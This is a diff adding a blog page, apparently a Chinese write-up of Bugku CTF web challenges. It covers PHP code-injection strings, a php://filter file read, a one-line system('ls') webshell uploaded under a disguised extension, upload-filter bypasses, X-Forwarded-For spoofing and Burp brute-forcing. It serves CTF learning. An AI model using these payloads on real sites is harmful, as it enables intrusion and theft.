@@ -1,0 +1,898 @@
+
+ <!DOCTYPE HTML>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>Bugku_Web_WriteUp | Hexo</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="John Doe">
+    
+
+    
+    <meta name="description" content="前言刷刷题，长长见识">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bugku_Web_WriteUp">
+<meta property="og:url" content="http://example.com/2018/12/16/%E5%A4%A7%E5%AD%A6CTF/Bugku-Web-WriteUp/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言刷刷题，长长见识">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/Fd23ee.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/Fd28dH.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/Fd2tJI.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/Fd2dQf.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/Fd2Deg.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/Fd2fyT.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/Fd2LSx.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/Fd2jOO.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdRFpt.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdRZnS.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdRdhR.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdRrjK.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdRynO.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdR6BD.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdRcHe.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdR2AH.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdR43t.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdRTu8.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdoriF.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdTEwV.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdTQyR.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdTYFO.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdTNfe.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdT5mq.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdTO1J.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/Fd7S76.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/Fd7ZnI.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/Fd7mHP.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/Fd7uAf.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/Fd7M4S.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/Fd7l9g.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/Fd7jPS.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdH9rn.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdHiV0.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/Fdq7r9.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/Fdqzxe.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FdOd1S.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/Fw9vTg.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FwCAmT.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FwCCpn.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FwCmtJ.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FwC80O.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FwCttH.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FwCNhd.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FwCrB8.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FwC6Ag.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FwPCUe.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FwP5RA.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FwiKL6.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/16/FwFnhQ.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/17/F0YLVK.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/17/F0YX5D.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/17/F0Yx8H.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/17/F0tSxA.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/17/F0tka8.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/17/F0te2j.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/17/F0tKrq.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/17/F0tMq0.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/17/F0t1aT.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/17/F0t3IU.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/17/F0tJG4.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/17/F0tdqx.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/17/F0tBdK.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/17/F0tDIO.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/17/F0tyJe.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/17/F0t6RH.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/17/F0tczd.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/17/F0theP.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/17/F0t5o8.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/17/F0t7WQ.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/17/F0tHzj.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/17/F0tqQs.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/12/17/F0tvwV.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/13/AL4QYD.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/13/AL4JOI.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/13/ALI0Mj.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/13/ALoUTx.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/13/ALTdDs.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/13/AL7ydI.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/13/ALHcnJ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/13/ALHTje.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/13/ALL27j.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/13/ALLocT.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/13/ALjdAJ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/13/ALjogP.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/13/ALvbxx.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/13/ALxVeS.png">
+<meta property="article:published_time" content="2018-12-16T08:50:11.000Z">
+<meta property="article:modified_time" content="2021-05-11T13:47:14.703Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2018/12/16/Fd23ee.png">
+
+    
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/tou1.png">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    
+<link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="/%02.css">
+<link rel="stylesheet" href="/.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.jpg" alt="Hexo" title="Hexo"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Hexo">Hexo</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/tags">Tags</a></li>
+					
+						<li><a href="/categories">Categories</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:example.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/12/16/大学CTF/Bugku-Web-WriteUp/" title="Bugku_Web_WriteUp" itemprop="url">Bugku_Web_WriteUp</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="John Doe" target="_blank" itemprop="author">John Doe</a>
+		
+  <p class="article-time">
+    <time datetime="2018-12-16T08:50:11.000Z" itemprop="datePublished"> Published 2018-12-16</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web2"><span class="toc-number">2.</span> <span class="toc-text">Web2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A1%E7%AE%97%E5%99%A8"><span class="toc-number">3.</span> <span class="toc-text">计算器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web%E5%9F%BA%E7%A1%80-Get"><span class="toc-number">4.</span> <span class="toc-text">web基础$_Get</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web%E5%9F%BA%E7%A1%80-POST"><span class="toc-number">5.</span> <span class="toc-text">web基础$_POST</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%9B%E7%9B%BE"><span class="toc-number">6.</span> <span class="toc-text">矛盾</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web3"><span class="toc-number">7.</span> <span class="toc-text">Web3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90"><span class="toc-number">8.</span> <span class="toc-text">域名解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%AE%A9%E4%BB%96%E5%81%9C%E4%B8%8B"><span class="toc-number">9.</span> <span class="toc-text">你必须让他停下</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB"><span class="toc-number">10.</span> <span class="toc-text">本地包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E4%B8%80"><span class="toc-number">11.</span> <span class="toc-text">变量一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web3-1"><span class="toc-number">12.</span> <span class="toc-text">Web3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%B4%E7%AD%89%E8%88%B1"><span class="toc-number">13.</span> <span class="toc-text">头等舱</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91"><span class="toc-number">14.</span> <span class="toc-text">网站被黑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F"><span class="toc-number">15.</span> <span class="toc-text">管理员系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web4"><span class="toc-number">16.</span> <span class="toc-text">Web4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag%E5%9C%A8index%E9%87%8C"><span class="toc-number">17.</span> <span class="toc-text">flag在index里</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%82%B9%E5%87%BB%E4%B8%80%E7%99%BE%E4%B8%87%E6%AC%A1"><span class="toc-number">18.</span> <span class="toc-text">点击一百万次</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB2"><span class="toc-number">19.</span> <span class="toc-text">本地包含2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87"><span class="toc-number">20.</span> <span class="toc-text">各种绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%82getshell"><span class="toc-number">21.</span> <span class="toc-text">求getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E6%9C%AC%E5%9C%B0%E7%BD%91%E7%AB%99"><span class="toc-number">22.</span> <span class="toc-text">程序员的本地网站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cookie%E6%AC%BA%E9%AA%97"><span class="toc-number">23.</span> <span class="toc-text">cookie欺骗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB"><span class="toc-number">24.</span> <span class="toc-text">速度要快</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D"><span class="toc-number">25.</span> <span class="toc-text">过狗一句话</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#md5-collision"><span class="toc-number">25.1.</span> <span class="toc-text">md5 collision</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#never-give-up"><span class="toc-number">25.2.</span> <span class="toc-text">never give up</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#welcome-to-bugkuctf"><span class="toc-number">25.3.</span> <span class="toc-text">welcome to bugkuctf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%EF%BC%9F%E6%AD%A3%E5%88%99%EF%BC%9F"><span class="toc-number">25.4.</span> <span class="toc-text">字符？正则？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5"><span class="toc-number">25.5.</span> <span class="toc-text">你从哪里来</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Web8"><span class="toc-number">25.6.</span> <span class="toc-text">Web8</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flag-php"><span class="toc-number">25.7.</span> <span class="toc-text">flag.php</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Trim%E7%9A%84%E7%AC%94%E8%AE%B0%E6%9C%AC"><span class="toc-number">25.8.</span> <span class="toc-text">Trim的笔记本</span></a></li></ol></li></ol>
+		
+		</div>
+		
+		<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>刷刷题，长长见识<span id="more"></span></p>
+<h3 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h3><p>直接查看源码即可</p>
+<h3 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h3><p><img src="https://s1.ax1x.com/2018/12/16/Fd23ee.png" alt="Fd23ee.png"><br>答案为两位数，输入却只能输入一位，F12查看源码</p>
+<p><img src="https://s1.ax1x.com/2018/12/16/Fd28dH.png" alt="Fd28dH.png"><br>然后，右键编辑HTML，改成maxlengt=”2”，输入计算结果，得到flag</p>
+<h3 id="web基础-Get"><a href="#web基础-Get" class="headerlink" title="web基础$_Get"></a>web基础$_Get</h3><p><img src="https://s1.ax1x.com/2018/12/16/Fd2tJI.png" alt="Fd2tJI.png"><br>PHP语句，GET方式上传信息，直接在后面加上?what=flag，得到flag<br><img src="https://s1.ax1x.com/2018/12/16/Fd2dQf.png" alt="Fd2dQf.png"></p>
+<h3 id="web基础-POST"><a href="#web基础-POST" class="headerlink" title="web基础$_POST"></a>web基础$_POST</h3><p><img src="https://s1.ax1x.com/2018/12/16/Fd2Deg.png" alt="Fd2Deg.png"><br>这题要post数据，Firefox安装一个hackbar插件，F12打开，输入如下，即可得到flag<br><img src="https://s1.ax1x.com/2018/12/16/Fd2fyT.png" alt="Fd2fyT.png"></p>
+<h3 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h3><p><img src="https://s1.ax1x.com/2018/12/16/Fd2LSx.png" alt="Fd2LSx.png"></p>
+<p>PHP函数<br>bool is_numeric ( mixed $var )<br>检测量是否为数字或数字字符<br>如果var是数字或者数字字符则返回true，否则返回false</p>
+<p>题目的意思是$num不是数字活数字字符，但是还要$num=1<br>$GET方式传参，可以令num=1x(x可以为任意字符)，即可得到flag<br><img src="https://s1.ax1x.com/2018/12/16/Fd2jOO.png" alt="Fd2jOO.png"></p>
+<h3 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h3><p><img src="https://s1.ax1x.com/2018/12/16/FdRFpt.png" alt="FdRFpt.png"></p>
+<p>查看源码，发现一串HTML字符<br><img src="https://s1.ax1x.com/2018/12/16/FdRZnS.png" alt="FdRZnS.png"></p>
+<p>写一个脚本，代码如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125&#x27;</span></span><br><span class="line">key=s.split(<span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    flag+=chr(int(i[2:]))</span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure>
+<p>拿到flag<br><img src="https://s1.ax1x.com/2018/12/16/FdRdhR.png" alt="FdRdhR.png"></p>
+<h3 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h3><p><img src="https://s1.ax1x.com/2018/12/16/FdRrjK.png" alt="FdRrjK.png"></p>
+<p>bugku原来的IP为下面的</p>
+<p><img src="https://s1.ax1x.com/2018/12/16/FdRynO.png" alt="FdRynO.png"></p>
+<p>这个IP也是无法访问的<br><img src="https://s1.ax1x.com/2018/12/16/FdR6BD.png" alt="FdR6BD.png"></p>
+<p>打开C:/windows/system32/drivers/etc目录下的hosts文件<br><img src="https://s1.ax1x.com/2018/12/16/FdRcHe.png" alt="FdRcHe.png"></p>
+<p>在最后一行加上123.206.87.240      flag.bugku.com，保存设置<br><img src="https://s1.ax1x.com/2018/12/16/FdR2AH.png" alt="FdR2AH.png"></p>
+<p>再次访问flag.bugku.com，得到flag，<br><img src="https://s1.ax1x.com/2018/12/16/FdR43t.png" alt="FdR43t.png"></p>
+<h3 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h3><p>直接用burpsuite抓包，然后找一找，就找到了<br><img src="https://s1.ax1x.com/2018/12/16/FdRTu8.png" alt="FdRTu8.png"></p>
+<h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><p><img src="https://s1.ax1x.com/2018/12/16/FdoriF.png" alt="FdoriF.png"></p>
+<p>REQUEST默认情况下包含了$_GET，$_POST 和 $_COOKIE 的数组。</p>
+<p>这题的目的就是要看到flag.php里的内容<br>方法有很多</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?hello=file(&#x27;flag.php&#x27;)</span><br><span class="line"></span><br><span class="line">?hello=1);show_source(&#x27;flag.php&#x27;);//</span><br><span class="line"></span><br><span class="line">?hello=1);show_source(&#x27;flag.php&#x27;);var_dump(</span><br></pre></td></tr></table></figure>
+<p>都可以的得到flag<br><img src="https://s1.ax1x.com/2018/12/16/FdTEwV.png" alt="FdTEwV.png"></p>
+<h3 id="变量一"><a href="#变量一" class="headerlink" title="变量一"></a>变量一</h3><p><img src="https://s1.ax1x.com/2018/12/16/FdTQyR.png" alt="FdTQyR.png"></p>
+<p>发现有$$的变量，直接用全局变量$GLOBALS即可，<br>?args=GLOBALS,进而构造出var_dump($GLOBALS)</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:8004/index1.php?args=GLOBALS</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Web3-1"><a href="#Web3-1" class="headerlink" title="Web3"></a>Web3</h3><p>查看源码，发现JSFUCK<br><img src="https://s1.ax1x.com/2018/12/16/FdTYFO.png" alt="FdTYFO.png"></p>
+<p>复制粘贴到console即可，或者JSFUCK在线解密一下<br><img src="https://s1.ax1x.com/2018/12/16/FdTNfe.png" alt="FdTNfe.png"></p>
+<h3 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h3><p>很简单，burpsuite抓包即可。<br><img src="https://s1.ax1x.com/2018/12/16/FdT5mq.png" alt="FdT5mq.png"></p>
+<h3 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h3><p>需要用御剑扫描器，扫描一下网站的后台<br><img src="https://s1.ax1x.com/2018/12/16/FdTO1J.png" alt="FdTO1J.png"></p>
+<p>打开index.php是原来网页，打开shell.php，出现webshell，要密码<br><img src="https://s1.ax1x.com/2018/12/16/Fd7S76.png" alt="Fd7S76.png"></p>
+<p>直接用burpsuite暴力破解，<br>先抓包，然后send to intruder<br><img src="https://s1.ax1x.com/2018/12/16/Fd7ZnI.png" alt="Fd7ZnI.png"></p>
+<p>点击positions，先点击clear，清除$，然后选中密码123456，点击add，添加$<br><img src="https://s1.ax1x.com/2018/12/16/Fd7mHP.png" alt="Fd7mHP.png"></p>
+<p>点击payload，进行如下选择，其他默认<br><img src="https://s1.ax1x.com/2018/12/16/Fd7uAf.png" alt="Fd7uAf.png"></p>
+<p>然后点击start attack<br><img src="https://s1.ax1x.com/2018/12/16/Fd7M4S.png" alt="Fd7M4S.png"></p>
+<p>一会之后，得到结果，然后观察爆破结果，length大部为1125，只有一个1110，异常，猜测这个就是密码，尝试登录，<br><img src="https://s1.ax1x.com/2018/12/16/Fd7l9g.png" alt="Fd7l9g.png"></p>
+<p>会回显flag</p>
+<h3 id="管理员系统"><a href="#管理员系统" class="headerlink" title="管理员系统"></a>管理员系统</h3><p>查看源代码，发现一段base64<br><img src="https://s1.ax1x.com/2018/12/16/Fd7jPS.png" alt="Fd7jPS.png"></p>
+<p>解密后得到<br><img src="https://s1.ax1x.com/2018/12/16/FdH9rn.png" alt="FdH9rn.png"></p>
+<p>尝试登录，用户名为admin，密码为test123<br><img src="https://s1.ax1x.com/2018/12/16/FdHiV0.png" alt="FdHiV0.png"></p>
+<p>IP禁止访问，请联系本地管理员登录<br>要伪装一下，伪装成本地IP，在headers添加一个伪装头部<br><img src="https://s1.ax1x.com/2018/12/16/Fdq7r9.png" alt="Fdq7r9.png"></p>
+<p>即可得到flag<br><img src="https://s1.ax1x.com/2018/12/16/Fdqzxe.png" alt="Fdqzxe.png"></p>
+<h3 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h3><p>查看源码，发现两串URl编码，在线解码后，发现<br><img src="https://s1.ax1x.com/2018/12/16/FdOd1S.png" alt="FdOd1S.png"></p>
+<p>直接提交，得到flag<br><img src="https://s1.ax1x.com/2018/12/16/Fw9vTg.png" alt="Fw9vTg.png"></p>
+<h3 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h3><p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
+
+<p>url上面有file参数，就想到了php里面的file协议，用base64转码把index.php里面的内容读出来，再解码，得到flag</p>
+<p>输入密码查看flag<br>要输入5位数字，字节暴力破解，bp一下即可得到flag<br><img src="https://s1.ax1x.com/2018/12/16/FwCAmT.png" alt="FwCAmT.png"><br><img src="https://s1.ax1x.com/2018/12/16/FwCCpn.png" alt="FwCCpn.png"></p>
+<h3 id="点击一百万次"><a href="#点击一百万次" class="headerlink" title="点击一百万次"></a>点击一百万次</h3><p>查看源码<br><img src="https://s1.ax1x.com/2018/12/16/FwCmtJ.png" alt="FwCmtJ.png"></p>
+<p>post一个clicks=1000000即可<br><img src="https://s1.ax1x.com/2018/12/16/FwC80O.png" alt="FwC80O.png"></p>
+<h3 id="本地包含2"><a href="#本地包含2" class="headerlink" title="本地包含2"></a>本地包含2</h3><p>查看源码，发现有个upload.php<br><img src="https://s1.ax1x.com/2018/12/16/FwCttH.png" alt="FwCttH.png"></p>
+<p>访问看看，到了一个文件上传网页<br><img src="https://s1.ax1x.com/2018/12/16/FwCNhd.png" alt="FwCNhd.png"></p>
+<p>构造一句话木马，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=php&gt;system(&quot;ls&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>更改文件名为1.php;.jpg，然后上传<br><img src="https://s1.ax1x.com/2018/12/16/FwCrB8.png" alt="FwCrB8.png"></p>
+<p>查看<br><img src="https://s1.ax1x.com/2018/12/16/FwC6Ag.png" alt="FwC6Ag.png"></p>
+<p>可以直接看到包含的文件<br><img src="https://s1.ax1x.com/2018/12/16/FwPCUe.png" alt="FwPCUe.png"></p>
+<p>再访问this_is_th3_F14g_154f65sd4g35f4d6f43.txt，即可得到flag<br><img src="https://s1.ax1x.com/2018/12/16/FwP5RA.png" alt="FwP5RA.png"></p>
+<h3 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h3><p><img src="https://s1.ax1x.com/2018/12/16/FwiKL6.png" alt="FwiKL6.png"></p>
+<p>GET获取uname，id<br>POST获取passwd</p>
+<p>===：比较两个变量的只和类型  ==：比较值，不比较类型<br>要使uname的sha1和值与passwd的sha1的值相等即可，但是同时他们两个的值又不能相等<br>很熟悉的套路  只要构造数组</p>
+<p>构造，即可得到flag<br><img src="https://s1.ax1x.com/2018/12/16/FwFnhQ.png" alt="FwFnhQ.png"></p>
+<h3 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h3><p>是一道文件上传题，<br>开始改了各种后缀名，尝试了很多都不行</p>
+<p>好不容易拿到这个的时候，还以为快成功了，搜了搜wp，发现还是做错了<br><img src="https://s1.ax1x.com/2018/12/17/F0YLVK.png" alt="F0YLVK.png"></p>
+<p>用bp抓包后，然后更改头部信息Content-Type,<br><img src="https://s1.ax1x.com/2018/12/17/F0YX5D.png" alt="F0YX5D.png"></p>
+<p>通过修改Content-type后字母的大小写可以绕过检测，<br>分别将后缀名修改为php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名），发现只有php5没有被过滤<br>然后修改文件后缀名为.php5</p>
+<p><img src="https://s1.ax1x.com/2018/12/17/F0Yx8H.png" alt="F0Yx8H.png"><br><img src="https://s1.ax1x.com/2018/12/17/F0tSxA.png" alt="F0tSxA.png"></p>
+<h3 id="程序员的本地网站"><a href="#程序员的本地网站" class="headerlink" title="程序员的本地网站"></a>程序员的本地网站</h3><p>要求从本地访问<br>直接bp抓包，伪装成本地登录，在头部添加 X-forwarded-for:127.0.0.1</p>
+<p><img src="https://s1.ax1x.com/2018/12/17/F0tka8.png" alt="F0tka8.png"></p>
+<p>在做题过程中发现了点问题，不知道是迷惑人，还是存在的bug</p>
